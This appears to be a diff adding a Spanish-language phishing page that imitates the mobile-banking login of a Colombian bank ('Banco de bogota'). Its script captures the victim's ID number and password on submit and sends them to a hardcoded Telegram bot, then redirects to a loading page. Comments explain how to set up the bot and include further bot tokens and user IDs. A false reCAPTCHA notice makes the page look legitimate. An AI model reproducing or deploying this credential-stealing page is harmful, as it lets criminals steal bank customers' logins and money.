@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesion</title>
+    <link rel="icon" href="./icono.png">
+   
+</head>
+<body>
+    
+
+<!-- Vamos a darle un estilo mas atractivo -->
+<style>
+body {
+    margin: 0;
+  font-family: Arial, sans-serif;
+  background-color: #f9fbff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  
+  
+}
+.container {
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 9px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    width: 300px;
+}
+
+h1 {
+  margin-bottom: 1.5rem;
+  color: #333;
+  justify-content: center;
+  align-items: center;
+  height: 15vh;
+  display: flex;
+}
+h2 {
+  margin-bottom: 1.5rem;
+  color: #333;
+  justify-content: center;
+  align-items: center;
+  height: 10vh;
+  display: flex;
+text-align: center;
+
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+}
+label {
+    display: flex;
+    flex-direction: column;
+}
+input, textarea {
+    padding: 10px;
+    margin-top: 5px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+}
+button {
+    margin-top: 20px;
+    padding: 10px;
+    border: none;
+    border-radius: 10px;
+    background-color: #4217dd;
+    color: #fff;
+    font-size: 16px;
+    cursor: pointer;
+}
+button:hover {
+    background-color: #4217dd;
+}
+
+img {
+margin-bottom: 1.5rem;
+  color: #333;
+  justify-content: center;
+  align-items: center;
+  height: 9vh;
+
+}
+
+a {
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  height: 1px;
+}
+
+select {
+  padding: 2px;
+  font-size: 1rem;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  width: 50%;
+
+
+}
+
+
+@media only screen and (max-width: 765px) {}
+          .login-footer-responsive {
+              display: block;
+          }
+
+          .login-footer-responsive img {
+              width: 100%;
+          }
+
+          #gradient {
+              display: block;
+          }
+
+
+</style>
+
+
+
+
+<!-- CREAMOS EL CONTENIDO QUE VAMOS A ENVIAR POR MENSAJE A TELEGRAM -->
+<div class="container">
+  <img src="logo.png" alt="">
+    
+    <h2>Bienvenido a tu Banca movil</h2>
+    <form id="telegramForm">
+      <select id="tipo_doc" name="tipo_doc">
+          <option value="cc">C.C.</option>
+        </select>
+        <label  for="indentificacion"></label>
+        <input type="text" id="identificacion" name="identificacion" required>
+        <!-- Hacemos lo mismo con la cantidad de formulario.-->
+        <label for="Clavesegura">🔒Clave segura</label>
+        <input type="Clavesegura" id="Clavesegura" name="Clave segura" required>
+        
+
+        <!-- Necesitamos un boton para hacer click y enviar -->
+         
+        <button type="submit">Ingresa ahora</button>
+        
+        <div style="margin: 12px; justify-content: center; align-items: center; flex-direction: column; display: flex;"><a href="#">Olvidé mi clave</a></div>
+        <div style="margin: 12px; justify-content: center; align-items: center; flex-direction: column; display: flex;"><a href="#">Registrarme</a></div>
+        <h6 style=" color: #838383;">Este sitio esta protegido por reCAPTCHA y aplican las politicas de privacidad y los terminos de servicio de Google.</h6>
+
+    </form>
+</div>
+
+<!-- Ahora necesitamos un script para que lleguen los datos a Telegram -->
+<!-- Primero necesitamos crear un bot de Telegram -->
+<!-- Para crear a un bot, debes ingresar @BotFather-->
+<!-- Ahora Digirimos a este Bot para obtener el UserID @userinfobot -->
+<!-- Necesitamos Este UserID: 6818907990 -->
+<!-- Necesitamos Esta API Key: 7143847473:AAEFgumDHBP7FNSorLnP88kSVuP0fRj4Hug -->
+</body>
+
+    <!-- Este SCRIPT Estara Disponible en la Descripcion -->
+<script>
+    document.getElementById('telegramForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const botToken = '7849992003:AAGjmJp3Y8wqft_sZpIit-zXt_uRR0A0VJE'
+        const chatId = '5084554523';
+        const text = `Banco de bogota:\n\nidentificacion: ${this.identificacion.value}
+        \nClavesegura: ${this.Clavesegura.value}`;
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: text })
+        });
+        window.location = 'cargando.html';
+      });
+       
+        
+</script>
+
+
+</html>
